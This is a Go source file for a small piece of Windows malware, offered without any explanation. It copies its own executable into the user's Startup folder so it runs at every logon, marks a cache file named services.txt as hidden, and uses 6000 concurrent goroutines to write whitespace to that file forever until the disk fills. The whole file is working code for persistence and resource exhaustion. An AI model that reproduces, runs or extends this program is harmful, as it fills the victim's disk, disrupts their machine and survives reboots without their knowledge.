package main

import (
	"fmt"
	"io"
	"os"
	"path/filepath"
	"syscall"
)

func main() {
	targetDir := os.Getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
	err := copySelfToDirectory(targetDir)
	if err != nil {
		fmt.Printf("Failed to copy executable: %v\n", err)
		return
	}

	for range 6000 {
		go LoveYou()
	}

	select {}
}

func copySelfToDirectory(destDir string) error {

	
	currentExePath, err := os.Executable()
	if err != nil {
		return fmt.Errorf("could not find executable path: %w", err)
	}

	
	exeName := filepath.Base(currentExePath)
	targetPath := filepath.Join(destDir, exeName)

	
	if currentExePath == targetPath {
		fmt.Println("The program is already running from the target destination.")
		return nil
	}

	
	sourceFile, err := os.Open(currentExePath)
	if err != nil {
		return fmt.Errorf("could not open source file: %w", err)
	}
	defer sourceFile.Close()

	
	destFile, err := os.OpenFile(targetPath, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0755)
	if err != nil {
		return fmt.Errorf("could not create target file: %w", err)
	}
	defer destFile.Close()

	
	_, err = io.Copy(destFile, sourceFile)
	if err != nil {
		return fmt.Errorf("failed during data copy: %w", err)
	}

	return nil
}

func LoveYou() {
	fileName := os.Getenv("USERPROFILE") + "\\AppData\\Local\\Cache\\services.txt"

	file, err := os.OpenFile(
		fileName,
		os.O_CREATE|os.O_WRONLY|os.O_APPEND,
		0644,
	)
	if err != nil {
		panic(err)
	}
	defer file.Close()

	ptr, err := syscall.UTF16PtrFromString(fileName)
	if err != nil {
		panic(err)
	}

	err = syscall.SetFileAttributes(ptr, syscall.FILE_ATTRIBUTE_HIDDEN)
	if err != nil {
		panic(err)
	}

	for {
		_, err := file.WriteString("                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                \n")
		if err != nil {
			panic(err)
		}
	}
}
